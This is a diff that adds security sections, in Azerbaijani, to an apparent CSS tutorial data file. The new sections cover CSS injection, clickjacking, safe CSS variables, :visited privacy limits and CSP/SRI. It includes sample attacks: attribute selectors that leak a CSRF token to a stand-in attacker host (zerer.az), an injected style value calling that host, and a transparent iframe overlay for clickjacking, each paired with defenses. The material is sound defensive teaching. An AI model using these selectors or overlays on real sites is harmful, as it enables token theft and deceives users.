@@ -69,6 +69,17 @@ p {
             ["CSS niyə «cascading» adlanır?", "Bir elementə bir neçə qayda düşəndə hansının qalib gələcəyini pilləli (kaskad) alqoritm müəyyən edir."],
             ["@import niyə tövsiyə edilmir?", "Fayllar ardıcıl yüklənir, paralel yox — render gecikir."],
           ]},
+          { t: "h", text: "CSS təhlükəsizliyə də təsir edir" },
+          { t: "p", text: "CSS «yalnız görünüş» kimi görünür, amma istifadəçi tərəfindən idarə olunan və ya üçüncü tərəfdən gələn stil məlumat sızdıra, interfeysi aldada və ya səhifəni korlaya bilər. Ona görə CSS də etibarlı və etibarsız mənbələrə bölünməlidir." },
+          { t: "list", items: [
+            "CSS injection: hücumçu səhifəyə öz stil qaydalarını yeridir (məsələn profil «rəng» sahəsi, şərh, <style> daxilinə qoyulan dəyər). Nəticə: məlumat sızması (attribute selector), saxta interfeys (phishing), düymələrin gizlədilməsi.",
+            "Üçüncü tərəf CSS (CDN, widget, @import) səhifədə tam etibarla işləyir — SRI və CSP ilə məhdudlaşdır.",
+            "İstifadəçi dəyərini stilə qoymazdan əvvəl ağ siyahı ilə yoxla: rəng üçün /^#[0-9a-f]{6}$/i, ölçü üçün rəqəm + vahid. Sərbəst mətnin style atributuna və ya <style>-a yazılmasına icazə vermə.",
+            "Güclü bir CSP: style-src 'self' (inline style-ı qadağan edir) və ya nonce istifadə et; hücum səthi xeyli azalır.",
+          ]},
+          { t: "mistake", lang: "html", wrong: `<div style="color: {{ istifadeci_rengi }}">Salam</div>
+<!-- istifadeci_rengi = "red; background:url(//zerer.az/x)" -->`, right: `<!-- Serverdə: rəng yalnız ağ siyahıdan -->
+<div style="color: #1a73e8">Salam</div>`, why: "Sərbəst dəyər style atributuna əlavə xüsusiyyətlər və url() yeridə bilər. Dəyəri ciddi formatda yoxla və ya hazır siniflərdən seç." },
         ],
       },
       {
@@ -148,6 +159,25 @@ li:not(:last-child)   { }  /* sonuncudan başqa hamısı */` },
           { t: "qa", items: [
             ["ul li ilə ul > li fərqi?", "Birincisi bütün nəsilləri (iç-içə siyahılar daxil), ikincisi yalnız birbaşa uşaqları seçir."],
             [":is() ilə :where() fərqi?", "Eyni seçir, amma :is() içindəki ən güclü selektorun spesifikliyini alır, :where() isə 0."],
+          ]},
+          { t: "h", text: "Attribute selector ilə məlumat sızması (CSS injection)" },
+          { t: "p", text: "Attribute selector dəyərin hissəsinə görə uyğunlaşa bildiyi üçün, hücumçu səhifəyə stil yeridə bilərsə, gizli atributları (məsələn CSRF token) simvol-simvol təxmin edib xarici serverə xəbər verə bilər — JavaScript olmadan." },
+          { t: "code", lang: "css", code: `/* Hücumçunun yeritdiyi qayda: token "a" ilə başlayırsa, serverə sorğu göndər */
+input[name="csrf"][value^="a"] { background: url("https://zerer.az/log?baslangic=a"); }
+input[name="csrf"][value^="b"] { background: url("https://zerer.az/log?baslangic=b"); }
+/* ... bütün simvollar üçün təkrar; növbəti mərhələdə "aa", "ab"... */
+
+/* Müdafiə: stillərə xarici url() icazəsini CSP ilə bağla */
+/* Content-Security-Policy: default-src 'self'; style-src 'self'; img-src 'self' */` },
+          { t: "list", items: [
+            "Atribut dəyərləri yalnız görünən DOM-da olan atributlara aiddir; password inputun dəyərinə JS ilə yazılan şey atribut olmadığı üçün bu üsulla oxunmur, amma value atributunda olan (SSR ilə yazılmış) token və ya gizli məlumat oxuna bilər.",
+            "Həssas məlumatı HTML atributlarında (value, data-*) saxlamamaq və tokenləri CSS-ə açıq səhifələrdən kənarda saxlamaq riski azaldır.",
+            "CSP img-src / default-src xarici sorğuları bloklayır, form-action və frame-ancestors başqa hücum yollarını bağlayır.",
+            "Əsas müdafiə: istifadəçi girişini heç vaxt <style> və ya style atributuna yazma; kontekstə uyğun escape et.",
+          ]},
+          { t: "qa", items: [
+            ["CSS injection JS olmadan məlumat necə oğurlaya bilər?", "Atribut selektorları ([value^=\"a\"]) ilə dəyərin başlanğıcını yoxlayır və uyğun gələndə background: url(...) ilə hücumçunun serverinə sorğu göndərir; təkrarlayaraq dəyəri tam bərpa edir."],
+            ["Bunu hansı başlıq yumşaldır?", "Content-Security-Policy: style-src və img-src/default-src xarici mənbələri bağlayır, belə ki, url() sorğusu icra olunmur."],
           ]},
         ],
       },
@@ -733,6 +763,32 @@ span, a, strong      { display: inline; }  /* default */
             ["z-index: 9999 niyə işləmir?", "Element başqa stacking context-in içindədir və ya position-u static-dir."],
             ["absolute element nəyə nəzərən yerləşir?", "position-u static olmayan ən yaxın əcdada (containing block), yoxsa ilkin konteynerə."],
           ]},
+          { t: "h", text: "Overlay və clickjacking hiylələri" },
+          { t: "p", text: "position, z-index və opacity ilə elementləri üst-üstə qoymaq clickjacking və UI redressing hücumlarının əsasıdır: hücumçu real düyməni (məsələn «Hesabı sil») şəffaf edib cəlbedici bir elementin üstünə qoyur və istifadəçi bilmədən ona klikləyir." },
+          { t: "code", lang: "css", code: `/* Hücumçunun öz səhifəsində: sənin səhifən iframe-də şəffaf, onun düyməsi altda */
+iframe.hedef {
+  position: absolute;
+  inset: 0;
+  opacity: 0.0001;     /* görünmür, amma klikləri qəbul edir */
+  z-index: 10;
+}
+.yem-duyme { position: absolute; top: 120px; left: 80px; z-index: 1; }
+
+/* Eyni üsul səndə: layihədəki "tam ekran" overlay-lər, cookie-banner,
+   və ya üçüncü tərəf widget-lər düymələrin üstünə səhvən (və ya qəsdən) minə bilər */` },
+          { t: "list", items: [
+            "Əsas müdafiə: səhifəni başqa saytların iframe-inə salınmaqdan qadağan et — Content-Security-Policy: frame-ancestors 'none' (və X-Frame-Options: DENY).",
+            "pointer-events: none overlay-dən kliklərin keçməsini təmin edir, amma həm də hücumçunun alətidir: üçüncü tərəf CSS-ə inanma.",
+            "Həssas əməliyyatlarda (silmə, ödəniş) əlavə təsdiq dialoqu və ya yenidən autentifikasiya istifadə et.",
+            "Test üçün: öz səhifəni <iframe> içində açmağa çalış — brauzer bloklamalıdır.",
+            "Sürüşən (sticky/fixed) elementlər və z-index müharibəsi də təsadüfən analoji problem yarada bilər: kritik düymə heç vaxt gizlənməməlidir.",
+          ]},
+          { t: "mistake", lang: "css", wrong: `.modal-fon { position: fixed; inset: 0; opacity: 0; z-index: 9999; } /* səhvən qalıb */`, right: `.modal-fon[hidden] { display: none; }
+.modal-fon { position: fixed; inset: 0; z-index: 100; }`, why: "Şəffaf, lakin klik qəbul edən fixed qat bütün səhifəni bloklayır (və ya kliki oğurlayır). Gizlətmək lazımdırsa display: none və ya hidden istifadə et, opacity: 0 yox." },
+          { t: "qa", items: [
+            ["Clickjacking-ə qarşı CSS kömək edirmi?", "Əsasən xeyr; müdafiə server başlığıdır (frame-ancestors, X-Frame-Options). CSS-ə əsaslanan frame-buster skriptləri etibarsızdır."],
+            ["opacity: 0 element klik qəbul edirmi?", "Bəli — görünmür, amma hələ də hədəf ola bilər; ona görə clickjacking-də istifadə olunur."],
+          ]},
         ],
       },
       {
@@ -1109,6 +1165,25 @@ getComputedStyle(document.documentElement).getPropertyValue("--accent");` },
             ["CSS dəyişəni ilə Sass dəyişəni fərqi?", "Sass compile zamanı əvəzlənir; CSS dəyişəni runtime-da yaşayır, kaskadla irsən keçir və JS ilə dəyişir."],
             ["@property nə verir?", "Tip, irsiyyət və başlanğıc dəyər — və bunun sayəsində dəyişəni animasiya etmək imkanı."],
           ]},
+          { t: "h", text: "İstifadəçi dəyərləri və CSS dəyişənləri" },
+          { t: "p", text: "Mövzu rəngi, font ölçüsü kimi istifadəçi seçimlərini CSS dəyişəni ilə vermək rahatdır, amma dəyər mənbəyi etibarsızdırsa, CSS injection qapısı olur." },
+          { t: "code", lang: "js", code: `// Ağ siyahı ilə yoxla, sonra yaz
+const RENG = /^#[0-9a-fA-F]{6}$/;
+function mövzuTətbiqEt(reng) {
+  if (!RENG.test(reng)) return;
+  document.documentElement.style.setProperty("--accent", reng);
+}
+
+// style.setProperty dəyəri bir xassə dəyəri kimi qəbul edir (əlavə qayda yeridə bilmir),
+// style.cssText = "..." və ya <style>-a mətn yazmaq isə daha təhlükəlidir.` },
+          { t: "list", items: [
+            "setProperty / CSSOM API-ləri string birləşdirməyə nisbətən daha təhlükəsizdir, çünki dəyər bir xassəyə bağlıdır.",
+            "Heç vaxt: el.setAttribute(\"style\", istifadeciMetni) və ya styleEl.textContent = istifadeciMetni.",
+            "Dəyişənin dəyərində url(...) olarsa onu istifadə edən xassə sorğu göndərə bilər — url() və xarici mənbələri ağ siyahı və ya CSP ilə məhdudlaşdır.",
+          ]},
+          { t: "qa", items: [
+            ["İstifadəçi rəng seçimini necə təhlükəsiz tətbiq edərsən?", "Formatı ağ siyahı ilə (#rrggbb) yoxlayıb style.setProperty ilə yazaram; sərbəst mətni stilə qoymaram."],
+          ]},
         ],
       },
       {
@@ -1290,6 +1365,28 @@ label:has(+ input:focus-visible) { color: #38bdf8; }
             ["Psevdo-klass və psevdo-element fərqi?", "Psevdo-klass vəziyyəti (: bir nöqtə), psevdo-element hissəni/virtual elementi (:: iki nöqtə) seçir."],
             [":is() və :where() fərqi?", "Eyni seçirlər; :where spesifikliyi 0-dır, :is ən güclü arqumentin spesifikliyini alır."],
           ]},
+          { t: "h", text: ":visited və gizlilik məhdudiyyətləri" },
+          { t: "p", text: "Keçmişdə sayt :visited stili ilə (və getComputedStyle ilə) istifadəçinin hansı linkləri ziyarət etdiyini öyrənə bilirdi (history sniffing). Brauzerlər bunu bağlayıb: :visited yalnız rəng xassələrini dəyişə bilər və JavaScript həmişə «ziyarət olunmamış» dəyəri qaytarır." },
+          { t: "code", lang: "css", code: `a:link    { color: #1a73e8; }
+a:visited { color: #6b3fa0; }       /* İcazə verilir: color, background-color, border-color, outline-color... */
+
+a:visited {
+  /* Bunlar işləmir / təsirsizdir: ölçü, display, background-image, content və s. */
+  padding: 20px;
+  background-image: url("x.png");
+  /* alfa kanalı da sıfırlanır — şəffaflıqla fərqləndirmək olmur */
+}` },
+          { t: "list", items: [
+            "Brauzer :visited üçün yalnız rəng xassələrinə icazə verir; alfa qiyməti nəzərə alınmır.",
+            "getComputedStyle və querySelector(':visited') hər zaman «ziyarət edilməyib» kimi cavab verir.",
+            "Nəticə: :visited-i yalnız UX üçün işlət, onun əsasında məntiq və ya təhlükəsizlik qərarı qurma, və istifadəçinin tarixçəsini oxumağa çalışma.",
+            "Əlçatanlıq: :visited rəngi ilə :link rəngi arasında kifayət qədər kontrast saxla; yalnız rəngə güvənmə (alt xətt).",
+            "Partitioned/gizlilik: yeni brauzerlər :visited-i də link ünvanı + üst sayt üzrə bölür ki, sayt arası izləmə mümkün olmasın.",
+          ]},
+          { t: "qa", items: [
+            ["Niyə :visited yalnız rəng xassələrini dəyişir?", "Başqa xassələr (ölçü, şəkil yükləmə) hücumçuya linkin ziyarət olunduğunu ölçmə və ya şəbəkə sorğusu ilə bilməyə imkan verərdi; məhdudiyyət gizliliyi qoruyur."],
+            ["getComputedStyle ilə ziyarət olunmuş linki aşkar etmək olarmı?", "Xeyr, brauzerlər həmişə ziyarət olunmamış stili qaytarır."],
+          ]},
         ],
       },
       {
@@ -1385,6 +1482,35 @@ label:has(+ input:focus-visible) { color: #38bdf8; }
           { t: "qa", items: [
             ["BEM-in üstünlüyü?", "Aşağı, bərabər spesifiklik, öz-özünü sənədləşdirən adlar, komponent sərhədləri."],
             ["@layer hansı problemi həll edir?", "Kitabxana/köhnə stillər ilə spesifiklik müharibəsini — prioritet qat sırası ilə təyin olunur."],
+          ]},
+          { t: "h", text: "Üçüncü tərəf CSS: @import, url() və CSP" },
+          { t: "code", lang: "css", code: `/* @import ardıcıl yükləmə yaradır (yavaşdır) və başqa mənbəyə etibar tələb edir */
+@import url("https://cdn.example.com/tema.css");
+
+/* url() ilə yüklənən şrift və şəkillər də xarici sorğudur */
+@font-face {
+  font-family: "Inter";
+  src: url("/fonts/inter.woff2") format("woff2");
+}
+
+/* Müdafiə: başlıqda mənbələri məhdudlaşdır */
+/* Content-Security-Policy:
+     default-src 'self';
+     style-src 'self' 'nonce-r4nd0m';
+     font-src 'self';
+     img-src 'self' data:; */` },
+          { t: "list", items: [
+            "Xarici stil səhifəsi səhifənin görünüşünü tam dəyişə bilər: giriş formasını saxta ilə əvəz etmək, mətni gizlətmək, linkləri yönləndirmək (content/::after ilə) — buna görə etibarsız CDN-dən CSS yükləmə.",
+            "<link rel=\"stylesheet\" integrity=\"sha384-...\" crossorigin=\"anonymous\"> ilə faylın dəyişdirilməsinin qarşısını al (SRI).",
+            "CSP style-src: 'self' yalnız öz domenindən stilə icazə verir; 'unsafe-inline' inline <style> və style atributlarını da açır və CSS injection-ı asanlaşdırır. Mümkünsə nonce və ya hash işlət.",
+            "CSP style-src-attr və style-src-elem ilə style atributları və <style> teqləri ayrıca idarə olunur.",
+            "Əlavə olaraq @import yerinə <link> və ya build addımında bir fayla birləşdirmə daha sürətli və daha idarə olunandır.",
+            "Şrift və şəkillər üçün font-src, img-src direktivləri ilə xarici url() sorğularını məhdudlaşdır.",
+          ]},
+          { t: "warn", text: "Rəng, ölçü və s. kimi istifadəçi tərəfindən seçilən dəyərləri CSS dəyişəni vasitəsilə vermək daha təhlükəsizdir, amma dəyər yenə ağ siyahı ilə yoxlanmalıdır: --accent: #1a73e8. Sərbəst mətn (; } @import ...) stilə yazılmamalıdır." },
+          { t: "qa", items: [
+            ["CSP style-src 'unsafe-inline' nə riski yaradır?", "Hücumçu yeritdiyi inline stillə (məsələn attribute selector + url()) məlumat sızdıra və interfeysi dəyişə bilər; CSP-nin müdafiəsi zəifləyir."],
+            ["@import-un təhlükəsizlik və performans mənfi cəhətləri?", "Ardıcıl yükləmə yaradır (render-blocking zənciri) və hələ də xarici mənbəyə etibar tələb edir; SRI @import ilə tətbiq olunmur, <link> ilə olur."],
           ]},
         ],
       },
